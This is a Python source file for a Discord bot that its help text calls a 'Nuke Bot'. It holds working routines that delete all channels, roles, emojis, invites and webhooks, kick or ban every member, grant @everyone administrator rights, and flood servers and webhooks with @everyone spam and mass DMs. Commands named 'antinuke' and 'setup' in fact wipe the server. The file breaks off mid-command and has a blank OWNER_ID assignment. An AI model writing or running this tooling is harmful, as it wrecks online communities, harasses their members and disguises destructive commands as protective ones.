from turtle import delay

import discord
from discord.ext import commands
import asyncio
import aiohttp
import time
import platform
import json
import os
from colorama import Fore

# --- CONFIGURATION ---
OWNER_ID =  # <--- YOUR DISCORD USER ID
DATA_FILE = "vault_data.json"
# ---------------------

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='atom', intents=intents, help_command=None)

authorized_users = set()
is_running = False
start_time = time.time()

# --- THEME COLORS ---
CLR_CRIMSON = 0xdc143c # For Nuke/Danger
CLR_NEON_BLUE = 0x00e8ff # For Status/Help
CLR_SLATE = 0x2f3136 # For neutral info

# --- DATA PERSISTENCE ---
def load_data():
    global authorized_users
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                data = json.load(f)
                authorized_users = set(data.get("authorized", []))
            except: authorized_users = set()
    else: save_data()

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump({"authorized": list(authorized_users)}, f, indent=4)

# --- ADVANCED HELPER FUNCTIONS FROM MAIN.PY ---

async def delete_all_webhooks(server):
    webhooks = await server.webhooks()
    delete_tasks = [webhook.delete() for webhook in webhooks]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

async def delete_all_channels(server):
    channels = server.channels
    for channel in channels:
        try:
            await channel.delete()
            print(f"{Fore.CYAN} [+] Channel '{channel.name}' deleted")
        except Exception as e:
            print(f"{Fore.RED} [!] Error deleting channel '{channel.name}': {e}")

async def create_channel_webhook(channel):
    try:
        webhook = await channel.create_webhook(name="Channel Webhook")
        print(f"{Fore.GREEN} [+] Webhook '{webhook.name}' created for channel '{channel.name}'")
        return webhook
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to create a webhook for channel '{channel.name}'")
        return None
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while creating a webhook for channel '{channel.name}': {e}")
        return None

async def send_message_in_channel(channel, message):
    try:
        await channel.send(message)
        print(f"{Fore.YELLOW} [+] Message sent to channel '{channel.name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to send messages in channel '{channel.name}'")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while sending a message in channel '{channel.name}': {e}")

async def change_server_name(server, new_name):
    try:
        await server.edit(name=new_name)
        print(f"{Fore.CYAN} [+] Server name changed to '{new_name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to change the server name.")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while changing the server name: {e}")

async def change_notification_setting(server, setting):
    try:
        await server.edit(default_notifications=setting)
        print(f"{Fore.BLUE} [+] Notification setting changed to '{setting}' for server '{server.name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to change the notification setting.")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while changing the notification setting: {e}")

async def change_permissions(server, add_admin):
    everyone_role = discord.utils.get(server.roles, name="@everyone")
    if everyone_role is None:
        print(f"{Fore.RED} [!] Could not find @everyone role.")
        return

    permissions = everyone_role.permissions
    if add_admin:
        permissions.administrator = True
        try:
            await everyone_role.edit(permissions=permissions)
            print(f"{Fore.GREEN} [+] Added administrator permissions to @everyone.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to change role permissions.")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
            else:
                print(f"{Fore.RED} [!] An error occurred while changing role permissions: {e}")

async def dm_everyone(server, message, client):
    """Send DM to all members in a server"""
    if len(server.members) <= 1:
        print(f"{Fore.YELLOW} [!] No other members to DM on this server.")
    else:
        count = 0
        errors = 0
        for member in server.members:
            if member == client.user:
                continue
            try:
                await member.send(message)
                count += 1
                print(f"{Fore.YELLOW} [+] Message sent to {member.name}")
            except discord.Forbidden:
                errors += 1
                print(f"{Fore.RED} [!] Bot doesn't have permission to send messages to {member.name}")
            except Exception as e:
                errors += 1
                print(f"{Fore.RED} [!] An error occurred while sending a message to {member.name}: {e}")

async def role_spam(server, role_name, num_roles):
    """Create multiple roles"""
    try:
        for i in range(num_roles):
            await server.create_role(name=role_name)
            print(f"{Fore.GREEN} [+] Role '{role_name}' created successfully.")
        print(f"{Fore.GREEN} [+] Successfully created {num_roles} roles.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while creating roles: {e}")

async def delete_all_roles(server):
    """Delete all non-default roles"""
    for role in server.roles:
        if role != server.default_role:
            try:
                await role.delete()
                print(f"{Fore.YELLOW} [+] Role '{role.name}' deleted successfully.")
            except discord.Forbidden:
                print(f"{Fore.RED} [!] Bot doesn't have permission to delete roles on this server.")
            except Exception as e:
                print(f"{Fore.RED} [!] An error occurred while deleting role '{role.name}': {e}")

async def spam_create_channels(server, text_channel_amount, voice_channel_amount, channel_name):
    """Create multiple text and voice channels"""
    try:
        channel_tasks = []

        for i in range(1, text_channel_amount + 1):
            new_channel_name = f"{channel_name}-{i}"
            channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
            channel_tasks.append(channel_task)

        for i in range(1, voice_channel_amount + 1):
            new_channel_name = f"{channel_name}-voice-{i}"
            channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
            channel_tasks.append(channel_task)

        await asyncio.gather(*channel_tasks)
        print(f"{Fore.GREEN} [+] Successfully created {text_channel_amount} text channels and {voice_channel_amount} voice channels.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while creating channels: {e}")

async def spam_create_categories(server, category_amount, category_name):
    """Create multiple categories"""
    try:
        for i in range(category_amount):
            new_category_name = f"{category_name}-{i+1}"
            await server.create_category(name=new_category_name)
            print(f"{Fore.GREEN} [+] Category '{new_category_name}' created successfully.")
        print(f"{Fore.GREEN} [+] Successfully created {category_amount} categories.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while creating categories: {e}")

async def kick_everyone(server, client):
    """Kick all members from server"""
    for member in server.members:
        try:
            if member != client.user:
                await member.kick()
                print(f"{Fore.GREEN} [+] Kicked {member.name} from the server.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to kick this member.")
        except Exception as e:
            print(f"{Fore.RED} [!] An error occurred while kicking {member.name}: {e}")

async def ban_everyone(server, client):
    """Ban all members from server"""
    for member in server.members:
        try:
            if member != client.user:
                await member.ban()
                print(f"{Fore.GREEN} [+] Banned {member.name} from the server.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to ban this member.")
        except Exception as e:
            print(f"{Fore.RED} [!] An error occurred while banning {member.name}: {e}")

async def unban_everyone(server):
    """Unban all members from server"""
    banned_users = await server.bans()
    for entry in banned_users:
        user = entry.user
        try:
            await server.unban(user)
            print(f"{Fore.GREEN} [+] Unbanned {user.name} from the server.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to unban this member.")
        except Exception as e:
            print(f"{Fore.RED} [!] An error occurred while unbanning {user.name}: {e}")

async def change_server_picture(server, image_url):
    """Change server icon/picture"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await server.edit(icon=image_data)
                    print(f"{Fore.GREEN} [+] Server picture changed successfully.")
                else:
                    print(f"{Fore.RED} [!] Failed to fetch image. Status code: {resp.status}")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to change the server picture.")
    except discord.HTTPException as e:
        print(f"{Fore.RED} [!] An error occurred while changing server picture: {e}")
    except Exception as e:
        print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

async def delete_all_emojis(server):
    """Delete all custom emojis from server"""
    try:
        tasks = []
        for emoji in server.emojis:
            tasks.append(emoji.delete())
            print(f"{Fore.GREEN} [+] Emoji '{emoji.name}' deleted successfully")
        await asyncio.gather(*tasks, return_exceptions=True)
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete emojis.")
    except Exception as e:
        print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

async def spam_emojis(server, image_urls):
    """Create multiple custom emojis from URLs"""
    try:
        async with aiohttp.ClientSession() as session:
            tasks = []
            for image_url in image_urls:
                async with session.get(image_url.strip()) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        emoji_name = image_url.split('/')[-1].split('.')[0][:32]
                        for _ in range(10):
                            tasks.append(server.create_custom_emoji(name=f"{emoji_name}_{_}", image=image_data))
                        print(f"{Fore.GREEN} [+] Emojis created successfully from: {image_url}")
                    else:
                        print(f"{Fore.RED} [!] Failed to fetch image from: {image_url}. Status code: {resp.status}")
            await asyncio.gather(*tasks, return_exceptions=True)
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to create emojis.")
    except Exception as e:
        print(f"{Fore.RED} [!] An unexpected error occurred: {e}")

async def delete_all_invites(server):
    """Delete all server invites"""
    try:
        while True:
            invites = await server.invites()
            if not invites:
                print(f"{Fore.GREEN} [+] All invites deleted.")
                break
            
            for invite in invites:
                try:
                    await invite.delete(reason="Deleting all invites")
                    print(f"{Fore.GREEN} [+] Successfully deleted invite: {invite.code}")
                except Exception as e:
                    print(f"{Fore.RED} [!] An error occurred while deleting invite: {e}")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete invites.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred: {e}")

async def spam_invites(server, num_invites):
    """Create multiple server invites"""
    try:
        if not server.text_channels:
            print(f"{Fore.RED} [!] No text channels available to create invites.")
            return
        invites = await asyncio.gather(*[server.text_channels[0].create_invite(max_age=0, max_uses=0) for _ in range(num_invites)])
        for invite in invites:
            print(f"{Fore.GREEN} [+] Successfully created invite: {invite.url}")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to create invites.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while creating invite: {e}")

async def spam_threads(server, channel_id=None, thread_count=10):
    """Create multiple threads in channels"""
    try:
        if channel_id:
            channel = server.get_channel(channel_id)
            if channel is None or not isinstance(channel, discord.TextChannel):
                print(f"{Fore.RED} [!] Channel not found or not a text channel.")
                return
            channels = [channel]
        else:
            channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]

        for channel in channels:
            for i in range(thread_count):
                thread_name = f"Spam Thread {i+1}"
                try:
                    thread = await channel.create_thread(name=thread_name)
                    print(f"{Fore.GREEN} [+] Successfully created thread '{thread_name}' in channel '{channel.name}'.")
                except discord.HTTPException as e:
                    print(f"{Fore.RED} [!] An error occurred while creating thread '{thread_name}' in channel '{channel.name}': {e.text}")

        print(f"{Fore.GREEN} [+] Successfully created all threads.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while creating threads: {e}")

async def deactivate_community(server):
    """Deactivate community features"""
    try:
        await server.edit(
            default_notifications=discord.NotificationLevel.all_messages,
            explicit_content_filter=discord.ContentFilter.disabled,
            verification_level=discord.VerificationLevel.low,
            community=False
        )
        print(f"{Fore.GREEN} [+] Community deactivated.")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Permission denied: You do not have permission to edit server settings.")
    except Exception as e:
        print(f"{Fore.RED} [!] An error occurred while deactivating community: {e}")

# --- BOT INITIALIZATION & STATUS ---

@bot.event
async def on_ready():
    """Bot ready event - sets status and initializes data"""
    load_data()
    
    # Set nice status
    activity = discord.Activity(
        type=discord.ActivityType.watching,
        name="🔥 Made By NanoDevs | Type atomhelp"
    )
    await bot.change_presence(activity=activity, status=discord.Status.do_not_disturb)
    
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}[✓] NANODEVS VAULTCORE - ONLINE")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}📊 Bot Status: {bot.user}")
    print(f"{Fore.YELLOW}🎯 Prefix: atom")
    print(f"{Fore.YELLOW}👤 Owner: {OWNER_ID}")
    print(f"{Fore.GREEN}🌐 Guilds: {len(bot.guilds)}")
    print(f"{Fore.GREEN}👥 Users: {sum(g.member_count for g in bot.guilds)}")
    print(f"{Fore.CYAN}{'='*60}{Fore.RESET}\n")

# --- PROFESSIONAL UI COMMANDS ---

@bot.command()
async def botstatus(ctx):
    uptime = time.strftime("%Hh %Mm %Ss", time.gmtime(time.time() - start_time))
    embed = discord.Embed(title="🔥 NANODEVS VAULTCORE - DIAGNOSTICS", color=CLR_CRIMSON)
    embed.description = (
        "**Premium Server Management Suite**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✨ *Made By NanoDevs | Elite Edition* ✨"
    )
    
    embed.add_field(name="📊 STATUS", value=f"```ONLINE - Ready for Operations```", inline=False)
    embed.add_field(name="⏱️ UPTIME", value=f"```{uptime}```", inline=True)
    embed.add_field(name="🌐 LATENCY", value=f"`{round(bot.latency * 1000)}ms`", inline=True)
    
    embed.add_field(name="👑 AUTHORITY", value=f"**Owner ID:** `{OWNER_ID}`", inline=True)
    
    env_info = (f"• **discord.py** `v{discord.__version__}`\n"
                f"• **aiohttp** `v{aiohttp.__version__}`\n"
                f"• **python** `v{platform.python_version()}`")
    embed.add_field(name="📦 ENVIRONMENT", value=env_info, inline=False)
    
    embed.add_field(name="🌍 NETWORK REACH", value=f"**Guilds:** `{len(bot.guilds)}` | **Users:** `{sum(g.member_count for g in bot.guilds)}`", inline=False)
    
    features = (
        "✅ Webhook-based server nuking\n"
        "✅ Advanced member management\n"
        "✅ Complete channel/role control\n"
        "✅ Multi-server support\n"
        "✅ Authorization system"
    )
    embed.add_field(name="🎯 FEATURES", value=features, inline=False)
    
    embed.set_footer(text="System Integrity: 100% | NanoDevs VaultCore V4 | Made By NanoDevs")
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)
    await ctx.send(embed=embed)

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="🔧 NANODEVS VAULTCORE - COMMAND HUB", color=CLR_NEON_BLUE)
    embed.description = (
        "**⚡ Advanced Discord Server Management & Nuke Bot**\n\n"
        "🛠️ **Made By:** NanoDevs\n"
        "💎 **Version:** 4.0 - Premium Edition\n"
        "📡 **Status:** Online & Ready\n\n"
        "```Advanced server manipulation toolkit with webhook support, "
        "member management, and complete server control. "
        "Full nuke capabilities with both direct and webhook-based operations.```\n"
        "**Use `atombotstatus` for system diagnostics**"
    )
    
    embed.add_field(name="🔓 PUBLIC", 
                    value="`atomhelp` - Show this\n`atombotstatus` - Bot status\n`atomauthlist` - Authorized users", inline=False)
    
    embed.add_field(name="🪝 WEBHOOK NUKE", 
                    value="`atomwebhooknuke <url>` - Full nuke via webhook\n`atomwebhookspam <url> <msg>` - Spam only\n`atomwebhookcreatechannels <url> [count]` - Create channels\n`atomwebhookinfo <url>` - Server info", inline=False)
    
    embed.add_field(name="💥 DIRECT NUKE", 
                    value="`atomsetup` - Full nuke current server\n`atomantinuke` - Full nuke (auth required)\n`atomnukechannels [guild_id] [count]` - Create channels", inline=False)
    
    embed.add_field(name="👥 MEMBER ACTIONS",
                    value="`atomdmall <message>` - DM all members\n`atomkickall` - Kick all members\n`atombanall` - Ban all members\n`atomunbanall` - Unban all members", inline=False)
    
    embed.add_field(name="🎭 ROLE MANAGEMENT",
                    value="`atomrolespam <name> <count>` - Create spam roles\n`atomdeleteroles` - Delete all roles\n`atomgiveadmin` - Give @everyone admin", inline=False)
    
    embed.add_field(name="💬 CHANNEL MANAGEMENT",
                    value="`atomdeleteallchannels` - Delete all channels\n`atomspamchannels <text> <voice> <name>` - Create channels\n`atomspamcategories <count> <name>` - Create categories\n`atomspamthreads <count>` - Create threads", inline=False)
    
    embed.add_field(name="📌 SERVER MODIFICATIONS",
                    value="`atomservername <name>` - Change server name\n`atomserverpicture <url>` - Change server icon\n`atomnotification` - Set notifications\n`atomdeactivatecommunity` - Disable community", inline=False)
    
    embed.add_field(name="😀 EMOJI MANAGEMENT",
                    value="`atomdeleteemojis` - Delete all emojis\n`atomspamemojis <urls>` - Create spam emojis", inline=False)
    
    embed.add_field(name="🔗 INVITE MANAGEMENT",
                    value="`atomdeleteinvites` - Delete all invites\n`atomspaminvites <count>` - Create invites", inline=False)
    
    embed.add_field(name="🪝 WEBHOOK MANAGEMENT",
                    value="`atomdeletewebhooks` - Delete all webhooks", inline=False)
    
    embed.add_field(name="📊 SERVER INFO",
                    value="`atomgetguildid` - Current server ID\n`atomlistservers` - All bot servers", inline=False)
    
    embed.add_field(name="⚙️ AUTHORIZATION",
                    value="`atomauth @user` - Grant access", inline=False)
    
    embed.add_field(name="🛑 CONTROL",
                    value="`atomstop` - Stop all tasks", inline=False)
    
    embed.set_footer(text="Prefix: atom | All commands available!")
    await ctx.send(embed=embed)

@bot.command()
async def authlist(ctx):
    embed = discord.Embed(title="🛡️ AUTHORIZED USERS", color=CLR_SLATE)
    if not authorized_users:
        embed.description = "*No personnel currently authorized for high-level clearance.*"
    else:
        mentions = [f"• <@{uid}> (`{uid}`)" for uid in authorized_users]
        embed.description = "\n".join(mentions)
    
    embed.set_footer(text="Only listed users can trigger atomantinuke")
    await ctx.send(embed=embed)

# --- CORE LOGIC (Turbo Speed) ---

async def send_webhook_log(webhook_url, message):
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(content=message)

async def webhook_spam(webhook_url, message, delay):
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        
        while True:
            try:
                await webhook.send(content=message)
                await asyncio.sleep(delay)
            except:
                break

async def turbo_spam(channel):
    global is_running
    while is_running:
        try:
            await channel.send("@everyone @here🚨 NANODEVS ON TOP 🚨")
            await asyncio.sleep(0.3)
        except:
            break

async def create_nuke_channels(guild, count=10):
    for i in range(count):
        if not is_running:
            break
        try:
            new_ch = await guild.create_text_channel(name="by-nanodevs")
            asyncio.create_task(turbo_spam(new_ch))
        except:
            continue

async def get_webhook_target_guild(webhook_url):
    """Get guild ID from webhook WITHOUT requiring bot to be in server"""
    try:
        # Extract webhook_id and token from URL
        parts = webhook_url.strip('/').split('/')
        webhook_id = int(parts[-2])
        webhook_token = parts[-1]
        
        print(f"Webhook ID: {webhook_id}, Token: {webhook_token[:20]}...")
        
        # Use bot's HTTP client to fetch webhook data - this works even if bot isn't in server!
        try:
            webhook_data = await bot.http.request(discord.http.Route("GET", f"/webhooks/{webhook_id}/{webhook_token}"))
            print(f"Webhook data received: {webhook_data}")
            
            # Get guild_id from webhook data
            guild_id = webhook_data.get('guild_id')
            if guild_id:
                guild_id = int(guild_id)
                print(f"Found guild_id in webhook: {guild_id}")
                return guild_id
            
            # Try channel_id
            channel_id = webhook_data.get('channel_id')
            if channel_id:
                print(f"Found channel_id in webhook: {channel_id}")
                return channel_id
                
        except Exception as e:
            print(f"Error fetching webhook data: {e}")
        
    except Exception as e:
        print(f"Error parsing webhook URL: {e}")
    
    return None

async def execute_vault(guild, kick_members=True):
    global is_running
    is_running = True
    
    # Send initial status (conditional based on kick_members)
    embed = discord.Embed(title="🔥 FULL NUKE INITIATED", color=CLR_CRIMSON)
    if kick_members:
        embed.description = "**Operations Starting:**\n✅ Kicking members\n✅ Deleting channels\n✅ Creating spam channels"
    else:
        embed.description = "**Operations Starting:**\n✅ Deleting channels\n✅ Creating spam channels"
    
    status_msg = None
    try:
        status_msg = await guild.text_channels[0].send(embed=embed) if guild.text_channels else None
    except:
        pass
    
    try: 
        await guild.edit(name="NUKED BY NANODEVS", reason="Nuked by NanoDevs")
    except: 
        pass

    # Kick all members FIRST (before deleting channels for better permissions)
    if kick_members:
        print(f"{Fore.RED}[*] Kicking all members...")
        await kick_everyone(guild, bot)
    
    # Delete all channels
    print(f"{Fore.RED}[*] Deleting all channels...")
    for ch in guild.channels:
        try:
            await ch.delete()
        except:
            pass
    
    # Create spam channels
    print(f"{Fore.GREEN}[*] Creating spam channels...")
    await create_nuke_channels(guild, count=10)
    
    is_running = False

# --- ACTION COMMANDS ---

@bot.command()
async def auth(ctx, user: discord.Member = None):
    if ctx.author.id == OWNER_ID and user:
        authorized_users.add(user.id)
        save_data()
        await ctx.send(f"✅ **Clearance Granted:** {user.mention} is now authorized.")

@bot.command()
async def webhook(ctx, webhook_url: str = None, guild_id: int = None):
    global is_running
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url:
        return await ctx.send("Usage: atomwebhook <url> [guild_id]")

    is_running = True
    
    # Try to get target guild from URL if guild_id not provided
    target_guild = None
    if guild_id:
        target_guild = bot.get_guild(guild_id)
    else:
        target_guild = await get_webhook_target_guild(webhook_url)
    
    if target_guild is None:
        await ctx.send("Webhook spam started. Could not resolve webhook guild - spam only mode.")
    else:
        await ctx.send(f"✅ Webhook spam started and channel creation underway in '{target_guild.name}'.")
        asyncio.create_task(create_nuke_channels(target_guild, count=10))

    asyncio.create_task(
        webhook_spam(webhook_url, "@everyone spam NanoDevs on top", 0.3)
    )

@bot.command()
async def createchannels(ctx, webhook_url: str = None, guild_id: int = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")

    if not webhook_url or not guild_id:
        return await ctx.send("Usage: atomcreatechannels <webhook_url> <guild_id>")

    target_guild = bot.get_guild(guild_id)
    
    if target_guild is None:
        embed = discord.Embed(title="❌ Guild Not Found", color=0xff0000)
        embed.description = f"The bot is not in guild `{guild_id}` or it doesn't exist.\nMake sure the bot is a member of the target server."
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title="🧪 Creating Channels via Webhook", color=CLR_NEON_BLUE)
    embed.description = f"Guild: `{target_guild.name}` (ID: `{target_guild.id}`)\nCreating 10 channels..."
    await ctx.send(embed=embed)
    
    global is_running
    is_running = True
    
    success_count = 0
    for i in range(10):
        if not is_running:
            break
        try:
            new_ch = await target_guild.create_text_channel(name=f"webhook-spam-{i+1}")
            success_count += 1
            print(f"✅ Created channel: {new_ch.name}")
            await asyncio.sleep(0.5)  # Small delay to avoid rate limiting
        except Exception as e:
            print(f"❌ Failed to create channel: {e}")
    
    result_embed = discord.Embed(title="✅ Channel Creation Complete", color=CLR_NEON_BLUE)
    result_embed.description = f"Successfully created `{success_count}/10` channels in `{target_guild.name}`"
    await ctx.send(embed=result_embed)
    is_running = False

@bot.command()
async def setup(ctx):
    """Setup nuke - create channels and spam (NO member kicks)"""
    embed = discord.Embed(title="⚡ SETUP NUKE ACTIVATED", color=CLR_CRIMSON)
    embed.description = "🔥 **Initiating server spam:**\n• Deleting all channels\n• Creating spam channels\n• Spamming messages"
    await ctx.send(embed=embed)
    await execute_vault(ctx.guild, kick_members=False)
    
    # Completion message
    result = discord.Embed(title="✅ SETUP COMPLETE", color=CLR_CRIMSON)
    result.description = "**Operations finished:**\n✓ All channels deleted\n✓ Spam channels created\n✓ Message spam active"
    try:
        await ctx.send(embed=result)
    except:
        pass

@bot.command()
async def stop(ctx):
    global is_running
    is_running = False
    embed = discord.Embed(title="🛑 SYSTEM ABORT", description="All active processes have been force-stopped.", color=CLR_CRIMSON)
    embed.set_footer(text="thanks for using our bot")
    await ctx.send(embed=embed)

@bot.command()
async def antinuke(ctx):
    """Full server nuke (authorized users only) with member kicks and channel spam"""
    if ctx.author.id == OWNER_ID or ctx.author.id in authorized_users:
        embed = discord.Embed(title="⚡ ANTINUKE ACTIVATED", color=CLR_CRIMSON)
        embed.description = "🔥 **Initiating full server destruction:**\n• Deleting all channels\n• Kicking all members\n• Creating spam channels"
        await ctx.send(embed=embed)
        await execute_vault(ctx.guild, kick_members=True)
        
        # Completion message
        result = discord.Embed(title="✅ NUKE COMPLETE", color=CLR_CRIMSON)
        result.description = "**Operations finished:**\n✓ All channels deleted\n✓ All members kicked\n✓ Spam channels created"
        try:
            await ctx.send(embed=result)
        except:
            pass
    else:
        await ctx.send("❌ **Access Denied.** Higher clearance level required.")

# --- NEW ADVANCED COMMANDS ---

@bot.command()
async def dmall(ctx, *, message: str = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    if not message:
        return await ctx.send("Usage: atomdmall <message>")
    await dm_everyone(ctx.guild, message, bot)

@bot.command()
async def rolespam(ctx, role_name: str = None, num_roles: int = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    if not role_name or not num_roles:
        return await ctx.send("Usage: atomrolespam <role_name> <number>")
    await role_spam(ctx.guild, role_name, num_roles)

@bot.command()
async def deleteroles(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await delete_all_roles(ctx.guild)

@bot.command()
async def giveadmin(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await change_permissions(ctx.guild, True)

@bot.command()
async def notification(ctx, setting: str = "all"):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await change_notification_setting(ctx.guild, discord.NotificationLevel.all_messages)

@bot.command()
async def deleteallchannels(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await delete_all_channels(ctx.guild)

@bot.command()
async def spamchannels(ctx, text_amount: int = 10, voice_amount: int = 5, name: str = "spam"):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await spam_create_channels(ctx.guild, text_amount, voice_amount, name)

@bot.command()
async def spamcategories(ctx, category_amount: int = 10, name: str = "spam"):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await spam_create_categories(ctx.guild, category_amount, name)

@bot.command()
async def kickall(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await kick_everyone(ctx.guild, bot)

@bot.command()
async def banall(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await ban_everyone(ctx.guild, bot)

@bot.command()
async def unbanall(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await unban_everyone(ctx.guild)

@bot.command()
async def servername(ctx, *, new_name: str = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    if not new_name:
        return await ctx.send("Usage: atomservername <new_name>")
    await change_server_name(ctx.guild, new_name)

@bot.command()
async def serverpicture(ctx, image_url: str = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    if not image_url:
        return await ctx.send("Usage: atomserverpicture <image_url>")
    await change_server_picture(ctx.guild, image_url)

@bot.command()
async def deleteemojis(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await delete_all_emojis(ctx.guild)

@bot.command()
async def spamemojis(ctx, *, urls: str = None):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    if not urls:
        return await ctx.send("Usage: atomspamemojis <url1> <url2> <url3>... (separate with spaces)")
    image_urls = urls.split()
    await spam_emojis(ctx.guild, image_urls)

@bot.command()
async def deleteinvites(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await delete_all_invites(ctx.guild)

@bot.command()
async def spaminvites(ctx, num_invites: int = 10):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await spam_invites(ctx.guild, num_invites)

@bot.command()
async def spamthreads(ctx, thread_count: int = 10):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await spam_threads(ctx.guild, None, thread_count)

@bot.command()
async def deactivatecommunity(ctx):
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    await deactivate_community(ctx.guild)

@bot.command()
async def nukechannels(ctx, guild_id: int = None, channel_count: int = 10):
    """Create many channels in target guild"""
    if ctx.author.id != OWNER_ID and ctx.author.id not in authorized_users:
        return await ctx.send("Access Denied")
    
    if not guild_id:
        # If no guild_id provided, use current guild
        guild_id = ctx.guild.id
    
    target_guild = bot.get_guild(guild_id)
    
    if target_guild is None:
        embed = discord.Embed(title="❌ Guild Not Found", color=0xff0000)
        embed.description = f"Bot is not in guild `{guild_id}`"
        await ctx.send(embed=embed)
        return
    
    embed = discord.Embed(title="🚀 Rapid Channel Creation", color=CLR_NEON_BLUE)
    embed.description = f"Creating {channel_count} channels in `{target_guild.name}`..."
    msg = await ctx.send(embed=embed)
    
    global is_running
    is_running = True
    success_count = 0
    
    for i in range(channel_count):
        if not is_running:
            break
        try:
            await target_guild.create_text_channel(name=f"nuke-{i+1}")
            success_count += 1
            if i % 5 == 0:
                await asyncio.sleep(0.3)
        except Exception as e:
            print(f"Error creating channel: {e}")
            await asyncio.sleep(0.5)
    
    result_embed = discord.Embed(title="✅ Channel Creation Done", color=CLR_CRIMSON)
    result_embed.description = f"Created `{success_count}/{channel_count}` channels in `{target_guild.name}`"
